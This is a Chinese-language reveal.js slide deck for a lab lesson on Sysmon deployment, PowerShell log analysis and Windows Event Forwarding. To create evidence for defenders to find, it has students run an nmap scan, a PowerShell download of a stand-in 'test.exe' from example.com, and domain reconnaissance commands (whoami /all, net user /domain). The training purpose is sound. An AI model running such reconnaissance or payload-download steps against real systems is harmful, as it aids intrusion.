@@ -1,0 +1,416 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1">
+<title>第29课 · 日志分析与入侵检测</title>
+<link rel="stylesheet" href="vendor/reveal.css">
+<link rel="stylesheet" href="vendor/monokai.css">
+<link rel="stylesheet" href="assets/course.css">
+</head>
+<body>
+<div class="reveal"><div class="slides">
+
+<!-- 01 封面 -->
+<section class="cover">
+<div class="frame">
+  <div class="bar"></div>
+  <p class="muted">项目 8 · 内网安全　|　第 29 次课 · 学时 57–58</p>
+  <h1>日志分析与入侵检测</h1>
+  <p class="muted">给系统装上"摄像头"，再学会看回放</p>
+  <div class="meta"><span class="chip">⏱ 80 分钟</span><span class="chip concept">🧑 独立操作</span><span class="chip lab">DC1 · SVR2 · Kali</span></div>
+</div>
+<aside class="notes">本课是模块的关键节点，产出一个重要快照 S8-NetSec。核心能力：部署 Sysmon 这个"系统监控摄像头"，学会在海量日志里找到可疑行为，并了解把多台机器日志集中起来的 Windows 事件转发（WEF）。开场提问：上节课的密码攻击，如果没有日志，你怎么知道发生过？引出"看不见就防不住"。</aside>
+</section>
+
+<!-- 02 路线图 -->
+<section>
+<div class="frame">
+  <h2>本课路线</h2>
+  <div class="body">
+    <div class="timeline">
+      <div class="seg" style="flex:22"><span class="t">22′</span><b>任务 1</b>Sysmon 部署<br>安装 · 验证 · 事件 ID</div>
+      <div class="seg" style="flex:27"><span class="t">27′</span><b>任务 2</b>日志分析实战<br>模拟可疑 → 分析</div>
+      <div class="seg" style="flex:18"><span class="t">18′</span><b>任务 3</b>事件转发 WEF<br>概念 + 配置</div>
+      <div class="seg" style="flex:13"><span class="t">13′</span><b>小结</b>快照 S8</div>
+    </div>
+    <div class="card blue">
+      <h3>下课时你应该能够</h3>
+      <ul class="points check">
+        <li>安装 Sysmon 并说出 5 个关键事件 ID 的含义</li>
+        <li>用 PowerShell 从 Sysmon 和安全日志里筛出可疑进程与登录</li>
+        <li>解释 Windows 事件转发（WEF）的收集器/源模式</li>
+      </ul>
+    </div>
+  </div>
+</div>
+<aside class="notes">任务 1、2 以 DC1 为主：你会先切到 Kali 上制造一点"噪声"流量，再切回 DC1 继续操作。任务 3 需要 SVR2 作为日志源、DC1 作为收集器，同样由你一个人依次在两台机器上配置。时间紧时任务 3 的 WEF 可只讲概念加演示 wecutil qc，具体订阅配置用教师预置的 subscription.xml。</aside>
+</section>
+
+<!-- 03 概念：为什么要 Sysmon -->
+<section>
+<div class="frame">
+  <div class="head"><span class="chip concept">概念</span><h2>Windows 自带日志 vs Sysmon</h2></div>
+  <div class="body">
+    <div class="grid2">
+      <div class="card"><h3>系统自带安全日志</h3><ul class="points"><li>记录登录、权限、策略变更</li><li>进程信息少、命令行默认不记</li><li>攻击者的具体动作难还原</li></ul></div>
+      <div class="card blue"><h3>Sysmon（Sysinternals）</h3><ul class="points"><li>记录进程创建的完整命令行</li><li>网络连接、DLL 加载、文件/注册表改动</li><li>攻击行为的"高清录像"</li></ul></div>
+    </div>
+    <div class="callout"><b>一句话：</b>安全日志告诉你"谁登录了"，Sysmon 告诉你"登录后干了什么"。</div>
+  </div>
+</div>
+<aside class="notes">Sysmon 是微软 Sysinternals 的免费工具，装成一个驱动+服务，把细粒度的系统活动写进自己的事件日志通道。它不替代安全日志，而是补充。强调它依赖一个配置文件 sysmon-config.xml 来决定记录什么、过滤什么，否则日志会爆炸。</aside>
+</section>
+
+<!-- 04 任务1 安装 Sysmon -->
+<section>
+<div class="frame">
+  <div class="head"><span class="chip lab">任务 1 <span class="t">· 22′ · DC1</span></span><h2>安装与验证 Sysmon</h2><button class="more" data-pop="pop-l29-t1-steps">📋 详细步骤</button><button class="more" data-pop="pop-l29-t1-why">💡 每项为什么</button></div>
+  <div class="body">
+    <div class="code-cap">以管理员运行，使用教师预置的配置文件</div>
+<pre><code class="language-powershell" data-trim>
+C:\Tools\Sysinternals\Sysmon64.exe -accepteula -i C:\Tools\sysmon-config.xml
+
+Get-Service Sysmon64
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 5
+</code></pre>
+    <div class="callout"><b>验证：</b>服务状态 Running，且能从 Sysmon 通道读出事件，说明部署成功。</div>
+  </div>
+</div>
+<aside class="notes">-accepteula 接受许可，-i 安装并加载配置。sysmon-config.xml 由教师预置（常用社区配置如 SwiftOnSecurity 版本）。如果 Get-Service 找不到 Sysmon64，可能是用了 32 位的 Sysmon.exe，服务名会是 Sysmon。装好后 Sysmon 立即开始记录，后面任务 2 制造的活动就能被它捕获。</aside>
+<template id="pop-l29-t1-steps">
+  <h3>📋 详细步骤：安装与验证 Sysmon</h3>
+  <h4>第一步：下载 Sysmon</h4>
+  <ol>
+    <li>浏览器打开 <code>https://learn.microsoft.com/sysinternals/downloads/sysmon</code>，下载 ZIP 并解压</li>
+    <li>把 <code>Sysmon64.exe</code> 复制到 <code>C:\Tools\Sysinternals\</code>（没有这个目录先新建）</li>
+  </ol>
+  <h4>第二步：准备配置文件</h4>
+  <ol>
+    <li>把教师提供（或自己编写）的 <code>sysmon-config.xml</code> 放到 <code>C:\Tools\sysmon-config.xml</code></li>
+    <li>配置文件决定 Sysmon 记录哪些事件、过滤掉哪些噪音，本课至少要覆盖 Event 1（进程创建）、3（网络连接）、11（文件创建）</li>
+  </ol>
+  <div class="tip">配置文件必须是无 BOM 或正常 UTF-8 的合法 XML；如果文件开头意外带了两次 BOM（常见于复制粘贴/编码转换），Sysmon 会报"Failed to load xml configuration (could not read file)"。</div>
+  <h4>第三步：安装 Sysmon</h4>
+<pre>C:\Tools\Sysinternals\Sysmon64.exe -accepteula -i C:\Tools\sysmon-config.xml</pre>
+  <p>看到 <code>Sysmon64 installed.</code> 和 <code>Sysmon64 started.</code> 说明安装成功。</p>
+  <h4>第四步：验证服务和日志</h4>
+<pre>Get-Service Sysmon64
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" -MaxEvents 5</pre>
+  <p>第一条应看到 <code>Status: Running</code>；第二条应能读出至少几条事件（Sysmon 装好立即开始记录系统活动，不需要等）。</p>
+</template>
+<template id="pop-l29-t1-why">
+  <h3>💡 每项为什么这么做</h3>
+  <table>
+    <tr><th style="width:26%">配置项</th><th>意义</th></tr>
+    <tr><td><code>-accepteula</code></td><td>接受微软的许可协议，没有这个参数首次运行会卡在交互式弹窗等待点击，适合脚本化/静默安装。</td></tr>
+    <tr><td><code>-i C:\Tools\sysmon-config.xml</code></td><td><b>i</b> = install，并指定配置文件。不加 <code>-i</code> 的话 Sysmon 用默认设置（记录几乎所有事件类型但不做任何过滤），数据量会迅速膨胀，几分钟就能攒几万条记录，不利于分析。</td></tr>
+    <tr><td>配置文件决定"记什么"</td><td>Sysmon 本身只是一个采集引擎，真正有价值的是配置文件里定义的"过滤规则"——哪些进程/网络行为值得记录，哪些是正常噪音应该排除。这正是"配置驱动"的监控思路，和第 26 课 Wireshark 的捕获/显示过滤器是同一类设计。</td></tr>
+    <tr><td>服务名 Sysmon64 而非 Sysmon</td><td>64 位版本的服务名带 64 后缀；如果误装了 32 位的 <code>Sysmon.exe</code>，服务名会变成 <code>Sysmon</code>，<code>Get-Service Sysmon64</code> 会找不到。排查时记得两个名字都查一下。</td></tr>
+    <tr><td>Sysmon 日志走独立的事件通道</td><td>不混在标准的"安全日志"或"系统日志"里，而是单独的 <code>Microsoft-Windows-Sysmon/Operational</code> 通道，方便单独管理、单独设置更大的日志容量上限（它记录的内容通常远多于标准日志）。</td></tr>
+  </table>
+</template>
+</section>
+
+<!-- 05 任务1 关键事件 ID -->
+<section>
+<div class="frame">
+  <div class="head"><span class="chip concept">任务 1 · 概念</span><h2>5 个必须记住的 Sysmon 事件 ID</h2></div>
+  <div class="body">
+    <table class="tbl">
+      <tr><th>Event ID</th><th>含义</th><th>排查用途</th></tr>
+      <tr><td><b>1</b></td><td>进程创建</td><td>看谁启动了什么、完整命令行</td></tr>
+      <tr><td><b>3</b></td><td>网络连接</td><td>发现外联、可疑端口</td></tr>
+      <tr><td><b>7</b></td><td>镜像加载（DLL）</td><td>发现 DLL 注入/劫持</td></tr>
+      <tr><td><b>11</b></td><td>文件创建</td><td>发现落地的恶意文件</td></tr>
+      <tr><td><b>13</b></td><td>注册表值修改</td><td>发现持久化（自启动项）</td></tr>
+    </table>
+    <div class="callout warn">其中 Event 1（进程创建）信息量最大，是入侵分析的首选起点。</div>
+  </div>
+</div>
+<aside class="notes">让学生把这 5 个 ID 抄下来，是本课必背内容。Event 1 的 CommandLine 字段能直接看到攻击者敲了什么命令，比如 whoami /all、net user /domain，这些都是侦察行为的标志。Event 3 能看到进程主动往外连，常用来发现 C2 回连。Event 13 结合 Run 键能发现持久化。</aside>
+</section>
+
+<!-- 06 任务2 制造可疑活动 -->
+<section>
+<div class="frame">
+  <div class="head"><span class="chip lab">任务 2 <span class="t">· 27′ · Kali+DC1</span></span><h2>先制造一些"可疑活动"</h2><button class="more" data-pop="pop-l29-t2a-steps">📋 详细步骤</button><button class="more" data-pop="pop-l29-t2a-why">💡 每项为什么</button></div>
+  <div class="body">
+    <div class="code-cap">Kali（外部扫描）</div>
+<pre><code class="language-bash" data-trim>
+nmap -sV 10.10.10.10 -p 80,443,445,3390
+curl http://10.10.10.10/
+</code></pre>
+    <div class="code-cap">DC1（模拟内部可疑行为）</div>
+<pre><code class="language-powershell" data-trim>
+iwr "http://example.com" -OutFile C:\Temp\test.exe `
+    -ErrorAction SilentlyContinue    # 模拟下载可疑文件
+whoami /all   > C:\Temp\recon.txt    # 收集本机权限
+net user /domain > C:\Temp\users.txt # 枚举域用户
+</code></pre>
+  </div>
+</div>
+<aside class="notes">任务 2 分两步，由你一个人依次完成：先切到 Kali 上做外部扫描，模拟攻击者的外部探测；然后切回 DC1，执行三条命令模拟内部主机"沦陷后"的典型侦察动作——下载可疑文件、收集本机权限、枚举域用户。这些都会被 Sysmon 的 Event 1、3、11 记录下来，供下一张幻灯片分析。example.com 下载在隔离网里会失败也没关系，重点是产生进程记录。</aside>
+<template id="pop-l29-t2a-steps">
+  <h3>📋 详细步骤：制造一些"可疑活动"</h3>
+  <h4>第一步：Kali 上模拟外部探测</h4>
+<pre>nmap -sV 10.10.10.10 -p 80,443,445,3390
+curl http://10.10.10.10/</pre>
+  <p>这两条命令会在 DC1 上产生网络连接事件（Sysmon Event 3）和防火墙日志记录。</p>
+  <h4>第二步：DC1 上模拟内部"沦陷后"的侦察行为</h4>
+  <p>切换到 DC1，以当前管理员身份打开 PowerShell：</p>
+<pre>iwr "http://example.com" -OutFile C:\Temp\test.exe `
+    -ErrorAction SilentlyContinue    # 模拟下载可疑文件
+whoami /all   > C:\Temp\recon.txt    # 收集本机权限
+net user /domain > C:\Temp\users.txt # 枚举域用户</pre>
+  <div class="tip">第一条在隔离的实验网里访问外网 example.com 大概率会超时失败，这是<b>预期内</b>的——我们要的不是真的下载成功，而是让 Sysmon 记录下"有进程尝试连接外部地址"这个行为本身。</div>
+  <h4>第三步：确认产物已生成</h4>
+<pre>Get-Item C:\Temp\recon.txt,C:\Temp\users.txt | Select-Object Name,Length</pre>
+  <p>两个文件都应该有实际内容（几百到几千字节），不是空文件。</p>
+</template>
+<template id="pop-l29-t2a-why">
+  <h3>💡 每条命令为什么要跑</h3>
+  <table>
+    <tr><th style="width:26%">命令</th><th>意义</th></tr>
+    <tr><td>Kali 的 nmap/curl</td><td>模拟"外部攻击者先探测再连接"的典型流程，让 Sysmon 的网络连接事件（Event 3）和防火墙日志里出现对应记录，衔接第 27 课学过的扫描检测。</td></tr>
+    <tr><td><code>iwr ... -OutFile test.exe</code></td><td>模拟"进程尝试下载并落地一个可执行文件"——这是很多真实攻击链（下载器/载荷投递）的共同特征，会触发 Sysmon Event 1（进程创建：PowerShell/iwr 本身）和潜在的 Event 11（文件创建，如果下载部分成功）。</td></tr>
+    <tr><td><code>whoami /all</code></td><td>查看当前用户的完整权限（SID、所属组、特权），是攻击者拿到一个 shell 后<b>几乎必做</b>的第一步侦察动作——"我现在是谁，有什么权限"。</td></tr>
+    <tr><td><code>net user /domain</code></td><td>枚举域内所有用户账户，是横向移动前的典型侦察行为——"这个域里还有谁，哪些账户可能是突破口"。</td></tr>
+    <tr><td>为什么这些命令会被 Sysmon 记录</td><td>任务 1 安装时加载的配置文件专门监控进程创建事件（Event 1），会把这几条命令的<b>完整命令行</b>都记录下来——这正是下一张幻灯片要分析的"证据"。</td></tr>
+  </table>
+</template>
+</section>
+
+<!-- 07 任务2 分析 Sysmon -->
+<section>
+<div class="frame">
+  <div class="head"><span class="chip check">任务 2 · 分析</span><h2>从 Sysmon 日志里找进程创建</h2><button class="more" data-pop="pop-l29-t2b-steps">📋 详细步骤</button><button class="more" data-pop="pop-l29-t2b-why">💡 每项为什么</button></div>
+  <div class="body">
+<pre><code class="language-powershell" data-trim>
+Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
+  Where-Object {$_.Id -eq 1} |
+  Select-Object TimeCreated,
+    @{N='CommandLine';E={$_.Properties[10].Value}} -First 20
+</code></pre>
+    <div class="callout"><b>找什么：</b>命令行里出现 <code>whoami /all</code>、<code>net user /domain</code>、下载 .exe —— 都是侦察/落地的信号。</div>
+  </div>
+</div>
+<aside class="notes">Event 1 的 Properties[10] 通常是 CommandLine 字段（下标随 Sysmon 版本略有不同，取不到可用 $_.Message 看全文）。让学生自己把刚才在任务 2 里敲的三条命令在这里找出来，建立"我做了什么 → 日志里长什么样"的直觉——这就是闭环：先以攻击者视角制造行为，再切回防御者视角去日志里找自己留下的痕迹。真实场景里，这些命令若不是管理员主动做的，就是入侵迹象。</aside>
+<template id="pop-l29-t2b-steps">
+  <h3>📋 详细步骤：从 Sysmon 日志里找进程创建</h3>
+  <h4>第一步：查询 Event 1（进程创建）</h4>
+<pre>Get-WinEvent -LogName "Microsoft-Windows-Sysmon/Operational" |
+  Where-Object {$_.Id -eq 1} |
+  Select-Object TimeCreated,
+    @{N='CommandLine';E={$_.Properties[10].Value}} -First 20</pre>
+  <div class="tip">如果 <code>Properties[10]</code> 显示出来的不是命令行文本（不同 Sysmon 版本字段下标可能不同），改用 <code>$_.Message</code> 看完整的事件描述文本，里面一定能找到 CommandLine 字段。</div>
+  <h4>第二步：在结果里找刚才敲的三条命令</h4>
+  <ol>
+    <li>找 <code>whoami /all</code> 对应的那一行，记下时间戳</li>
+    <li>找 <code>net user /domain</code> 对应的那一行</li>
+    <li>找涉及 <code>iwr</code> 或 PowerShell 下载相关的那一行</li>
+  </ol>
+  <h4>第三步：建立"操作 → 日志"的对应关系</h4>
+  <p>把"我刚才做了什么"和"日志里具体长什么样"一一对上，这是分析入侵痕迹最基础的能力——真实场景里你不知道攻击者做了什么，但同样的方法可以用来"读出"攻击者做过什么。</p>
+</template>
+<template id="pop-l29-t2b-why">
+  <h3>💡 每项为什么这么做</h3>
+  <table>
+    <tr><th style="width:26%">内容</th><th>意义</th></tr>
+    <tr><td><code>Where-Object {$_.Id -eq 1}</code></td><td>Sysmon 的 Event ID 1 专门对应"进程创建"，这是信息量最大的事件类型——每次有新进程启动（包括完整的命令行参数）都会生成一条。</td></tr>
+    <tr><td><code>Properties[10]</code></td><td>Sysmon 事件对象把结构化字段按顺序存在 <code>Properties</code> 数组里，第 10 个（下标从0开始）通常对应 CommandLine，但这个下标会随 Sysmon 版本变化，不是绝对可靠的，所以要留排障手段（看 Message 全文）。</td></tr>
+    <tr><td>命令行里出现侦察类命令</td><td>如果这些命令不是管理员主动执行的（比如来自一个未知的远程会话、或者在非正常时间出现），就是典型的"入侵后侦察"迹象——这正是本课要训练的判读能力。</td></tr>
+    <tr><td>"我做了什么 → 日志里长什么样"</td><td>这是建立安全直觉最有效的方法：先知道正常操作在日志里的样子，才能在面对真实、未知的攻击时识别出"异常"。</td></tr>
+  </table>
+</template>
+</section>
+
+<!-- 08 任务2 分析安全日志 -->
+<section>
+<div class="frame">
+  <div class="head"><span class="chip check">任务 2 · 分析</span><h2>安全日志里的可疑登录模式</h2><button class="more" data-pop="pop-l29-t2c-steps">📋 详细步骤</button><button class="more" data-pop="pop-l29-t2c-why">💡 每项为什么</button></div>
+  <div class="body">
+<pre><code class="language-powershell" data-trim>
+$events = Get-WinEvent -FilterHashtable @{
+  LogName='Security'; ID=4625; StartTime=(Get-Date).AddHours(-2)
+}
+$events | Group-Object {$_.Properties[19].Value} |
+  Where-Object {$_.Count -gt 5} |
+  Format-Table Count, Name -AutoSize
+</code></pre>
+    <div class="callout warn"><b>判读：</b>同一来源在 2 小时内失败超过 5 次，高度可疑——很可能是密码攻击。</div>
+  </div>
+</div>
+<aside class="notes">这是把第 28 课的技能复用过来：按来源 IP 分组统计失败登录，只保留超过 5 次的。StartTime 限定最近 2 小时，避免翻历史记录。阈值 5 只是示例，实际要结合业务基线。强调"异常"是相对正常基线而言的，所以平时就要知道正常长什么样。</aside>
+<template id="pop-l29-t2c-steps">
+  <h3>📋 详细步骤：安全日志里的可疑登录模式</h3>
+  <h4>第一步：取最近 2 小时的 4625 事件</h4>
+<pre>$events = Get-WinEvent -FilterHashtable @{
+  LogName='Security'; ID=4625; StartTime=(Get-Date).AddHours(-2)
+}</pre>
+  <p>如果上节课（第 28 课）的 Hydra 攻击演示是在 2 小时内做的，这里应该能看到那批失败记录。</p>
+  <h4>第二步：按来源分组统计</h4>
+<pre>$events | Group-Object {$_.Properties[19].Value} |
+  Where-Object {$_.Count -gt 5} |
+  Format-Table Count, Name -AutoSize</pre>
+  <p>输出会列出"失败次数超过 5"的来源，<code>Name</code> 列是来源 IP（或主机名，取决于事件字段）。</p>
+  <h4>第三步：判读</h4>
+  <ol>
+    <li>如果看到 10.10.10.50（Kali）出现大量失败记录，这正是第 28 课密码喷射留下的证据</li>
+    <li>讨论：阈值"5"是不是固定不变的？正常用户偶尔输错密码 1-2 次算正常，但短时间内几十次必然可疑</li>
+  </ol>
+</template>
+<template id="pop-l29-t2c-why">
+  <h3>💡 每项为什么这么做</h3>
+  <table>
+    <tr><th style="width:26%">内容</th><th>意义</th></tr>
+    <tr><td><code>StartTime=(Get-Date).AddHours(-2)</code></td><td>限定查询时间范围，避免把几天甚至几周前的历史失败记录也翻出来，影响"异常检测"的时效性——我们关心的是"最近"发生了什么。</td></tr>
+    <tr><td><code>Group-Object {$_.Properties[19].Value}</code></td><td>4625 事件的 <code>Properties[19]</code> 通常是来源 IP 地址，按这个字段分组统计，就能看出"是不是同一个来源在反复尝试"——这是识别密码喷射/暴力破解的核心思路。</td></tr>
+    <tr><td><code>Where-Object {$_.Count -gt 5}</code></td><td>只保留失败次数明显偏高的来源，过滤掉偶尔输错密码的正常噪音。阈值 5 只是教学示例，真实环境要结合历史基线动态调整。</td></tr>
+    <tr><td>"异常"相对"正常基线"而言</td><td>这是安全监控的核心哲学：没有绝对的"坏行为"特征，只有相对于正常使用模式的"偏离"。要能识别异常，先要知道日常环境里"正常"长什么样。</td></tr>
+  </table>
+</template>
+</section>
+
+<!-- 09 任务3 WEF 概念 -->
+<section>
+<div class="frame">
+  <div class="head"><span class="chip concept">任务 3 <span class="t">· 18′</span></span><h2>概念：集中日志管理 WEF</h2></div>
+  <div class="body">
+    <div class="flow">
+      <div class="node"><b>SVR2</b>日志源</div>
+      <div class="arrow">→</div>
+      <div class="node hl"><b>DC1</b>收集器</div>
+      <div class="arrow">→</div>
+      <div class="node"><b>集中分析</b>一处看全网</div>
+    </div>
+    <div class="grid2">
+      <div class="card"><h3>为什么要集中</h3><ul class="points"><li>多台机器日志散落难关联</li><li>被攻陷主机的日志可能被清</li><li>集中后可统一检索、留证</li></ul></div>
+      <div class="card blue"><h3>两种订阅模式</h3><ul class="points"><li><b>收集器发起</b>：收集器主动去拉</li><li><b>源发起</b>：源主动推送到收集器</li></ul></div>
+    </div>
+  </div>
+</div>
+<aside class="notes">Windows Event Forwarding（WEF）是把多台机器的日志转发到一台集中保存。把日志集中到独立服务器还有一个安全意义：即使某台机器被攻陷、本地日志被清，收集器上的副本还在，能用于取证。两种模式的区别就是谁发起连接——源发起更适合大规模环境。</aside>
+</section>
+
+<!-- 10 任务3 WEF 配置 -->
+<section>
+<div class="frame">
+  <div class="head"><span class="chip lab">任务 3 <span class="t">· 18′</span></span><h2>配置收集器与日志源</h2><button class="more" data-pop="pop-l29-t3-steps">📋 详细步骤</button><button class="more" data-pop="pop-l29-t3-why">💡 每项为什么</button></div>
+  <div class="body">
+    <div class="code-cap">DC1 配置为收集器</div>
+<pre><code class="language-powershell" data-trim>
+wecutil qc                              # 快速配置收集器
+wecutil cs C:\LabFiles\subscription.xml # 创建订阅（教师预置 xml）
+</code></pre>
+    <div class="code-cap">SVR2（VM2）配置为日志源</div>
+<pre><code class="language-powershell" data-trim>
+winrm quickconfig
+# 把 DC1 的计算机账户加入 "Event Log Readers" 组
+</code></pre>
+  </div>
+</div>
+<aside class="notes">wecutil qc 一键把 DC1 变成能接收转发的收集器；wecutil cs 导入订阅定义，subscription.xml 由教师预置，规定了收哪些机器的哪些日志。SVR2 侧 winrm quickconfig 打开 WinRM 服务，并把收集器（DC1）的计算机账户加进 Event Log Readers 组授权读日志。配置完成后在 DC1 的"转发的事件"日志里应能看到 SVR2 的记录流入。单机环境（无 SVR2）这部分只能做到第一步，check29.ps1 会诚实标记为无法验证。</aside>
+<template id="pop-l29-t3-steps">
+  <h3>📋 详细步骤：配置收集器与日志源（WEF）</h3>
+  <div class="tip">⚠️ 这个任务需要<b>第二台域成员服务器 SVR2</b> 配合才能完整验证。如果你的实验环境只有 DC1 一台机器，可以只做第一步（DC1 配置成收集器）、理解概念，第二步（SVR2 侧配置）和最终验证留给有 SVR2 的环境，check29.ps1 对这部分会诚实标记为"需要 SVR2，本环境无法验证"，不影响其它任务的得分。</div>
+  <h4>第一步：DC1 上快速配置收集器</h4>
+<pre>wecutil qc</pre>
+  <p>会提示是否要配置 Windows Event Collector 服务为自动启动，输入 <code>Y</code> 确认。</p>
+  <h4>第二步：导入订阅定义</h4>
+<pre>wecutil cs C:\LabFiles\subscription.xml</pre>
+  <p>subscription.xml 由教师预置，里面定义了"从哪些机器收集哪些日志"。如果没有这个文件，可以用 <code>wecutil cs</code> 结合一个简单的 XML 模板手动创建一条"源发起"订阅。</p>
+  <h4>第三步（需要 SVR2）：在日志源机器上开启 WinRM</h4>
+<pre>winrm quickconfig</pre>
+  <h4>第四步（需要 SVR2）：授权收集器读取日志</h4>
+  <ol>
+    <li>在 SVR2 本地的 <b>Event Log Readers</b> 组里，加入 DC1 的计算机账户（格式类似 <code>LAB\DC-01$</code>，注意结尾的 <code>$</code>）</li>
+  </ol>
+  <h4>第五步（需要 SVR2）：验证</h4>
+  <ol>
+    <li>等几分钟，在 DC1 事件查看器里展开 <b>转发的事件</b>（Forwarded Events）日志</li>
+    <li>应该能看到标注来源是 SVR2 的事件记录流入</li>
+  </ol>
+</template>
+<template id="pop-l29-t3-why">
+  <h3>💡 每项为什么这么做</h3>
+  <table>
+    <tr><th style="width:26%">配置项</th><th>意义</th></tr>
+    <tr><td><code>wecutil qc</code></td><td>一键启用并配置 Windows Event Collector 服务，这是接收转发日志的前提条件，默认是关闭的。</td></tr>
+    <tr><td><code>wecutil cs subscription.xml</code></td><td>创建一条"订阅"（subscription），定义收集哪些源机器的哪些日志通道。WEF 本身不会自动收集任何东西，必须显式定义订阅规则。</td></tr>
+    <tr><td><code>winrm quickconfig</code>（源侧）</td><td>WEF 底层依赖 WinRM 协议传输日志，源机器必须开启并正确配置 WinRM 服务，否则收集器连接不上。</td></tr>
+    <tr><td>加入 Event Log Readers 组</td><td>收集器要读取源机器的日志，必须有相应的读取权限——这是最小权限原则的体现：只给"读日志"这一项权限，不给管理员权限。</td></tr>
+    <tr><td>为什么要集中日志</td><td>多台机器的日志散落各处，分析时需要来回切换、难以关联；更重要的是：如果一台机器被攻陷，攻击者往往会清除本地日志掩盖痕迹，而收集器上的副本不受影响，是取证的关键保障。</td></tr>
+    <tr><td>两种订阅模式的区别</td><td>"收集器发起"适合少量机器、收集器主动连接拉取；"源发起"适合大规模环境，源机器主动推送，减轻收集器维护大量连接的压力。</td></tr>
+  </table>
+</template>
+</section>
+
+<!-- 11 排障 -->
+<section>
+<div class="frame">
+  <div class="head"><span class="chip check">排障</span><h2>Sysmon / WEF 不工作？</h2></div>
+  <div class="body">
+    <table class="tbl">
+      <tr><th style="width:34%">现象</th><th style="width:33%">原因</th><th>处理</th></tr>
+      <tr><td>Get-Service 找不到 Sysmon64</td><td>装的是 32 位版</td><td>服务名改查 <code>Sysmon</code></td></tr>
+      <tr><td>Sysmon 日志为空</td><td>配置过滤太狠/没加载</td><td>检查 <code>-i</code> 配置，必要时用默认配置</td></tr>
+      <tr><td>CommandLine 取不到</td><td>Properties 下标随版本变</td><td>改用 <code>$_.Message</code></td></tr>
+      <tr><td>WEF 收不到源日志</td><td>WinRM/组权限未配</td><td>源上 <code>winrm quickconfig</code>，加 Event Log Readers</td></tr>
+      <tr><td>订阅状态 Inactive</td><td>xml 路径或语法错</td><td>核对 subscription.xml</td></tr>
+    </table>
+  </div>
+</div>
+<aside class="notes">最常见是 Sysmon 日志为空：要么过滤规则把一切都排除了，要么配置没真正加载。可以先用一个最小配置或 Sysmon 默认（不带 -i）确认能产日志，再逐步加过滤。WEF 的坑集中在 WinRM 和权限，源上一定要跑 quickconfig 并授权收集器账户读日志。</aside>
+</section>
+
+<!-- 12 小结 -->
+<section>
+<div class="frame">
+  <div class="head"><span class="chip check">小结</span><h2>本课小结</h2></div>
+  <div class="body">
+    <div class="grid3">
+      <div class="card blue"><h3>部署</h3><p class="small">Sysmon = 系统活动高清录像，靠配置文件决定记什么</p></div>
+      <div class="card blue"><h3>分析</h3><p class="small">Event 1 看命令行，4625 分组看攻击源</p></div>
+      <div class="card blue"><h3>集中</h3><p class="small">WEF 把日志汇到收集器，防清除、便检索</p></div>
+    </div>
+    <div class="callout"><b>下节课 · 阶段考核 5：</b>创新模块B考核，红蓝对抗。把本模块的扫描、密码攻防、日志分析综合起来实战。</div>
+    <div class="callout"><b>📎 作业提交：</b>下载 <a href="downloads/check29.ps1" download>check29.ps1</a> 和 <a href="downloads/checklib.ps1" download>checklib.ps1</a>（放同一目录），在 DC1 以管理员身份运行 <code>check29.ps1</code> 生成检查报告，连同 Sysmon 事件截图一起提交。</div>
+  </div>
+</div>
+<aside class="notes">出口小测：1. Sysmon Event 1 记录的是什么？为什么它最有用？2. 发现同一 IP 大量 4625 说明什么？3. 把日志集中到收集器有什么安全好处？收尾对照清单逐项核对，并拍下关键快照 S8-NetSec——下一个 阶段考核 从它开始。</aside>
+</section>
+
+<!-- 13 验证提交 -->
+<section>
+<div class="frame">
+  <div class="head"><span class="chip check">验证与提交</span><h2>对照清单自查 · 关键快照</h2></div>
+  <div class="body">
+    <p class="muted">对照下面的清单逐项自查，全部达成后再拍快照：</p>
+    <div class="grid2">
+      <ul class="points check">
+        <li>Sysmon64 服务 Running，能读出事件</li>
+        <li>任务 2 的可疑进程、失败登录已找到并记录</li>
+        <li>DC1 收集器与 SVR2 源的 WEF 已配置</li>
+      </ul>
+      <div class="card">
+        <h3>📸 关键快照</h3>
+        <p>相关 VM 拍快照<br><code>S8-NetSec</code></p>
+      </div>
+    </div>
+  </div>
+</div>
+<aside class="notes">在 DC1 上逐项核对清单，具体项以本校要求为准。本课程暂未提供自动评分脚本，由师生对照清单人工验收。S8-NetSec 是本模块的里程碑快照，务必拍好——阶段考核 5 以及后续综合实战都依赖它。</aside>
+</section>
+
+</div></div>
+<div class="foot"><span>Windows 服务器配置与安全管理</span><span></span></div>
+<script src="vendor/reveal.js"></script>
+<script src="vendor/plugin-highlight.js"></script>
+<script src="vendor/plugin-notes.js"></script>
+<script src="assets/popup.js"></script>
+<script>
+Reveal.initialize({hash:true,slideNumber:'c/t',transition:'fade',transitionSpeed:'fast',center:false,width:1280,height:720,margin:0.04,plugins:[RevealHighlight,RevealNotes]});
+</script>
+</body>
+</html>
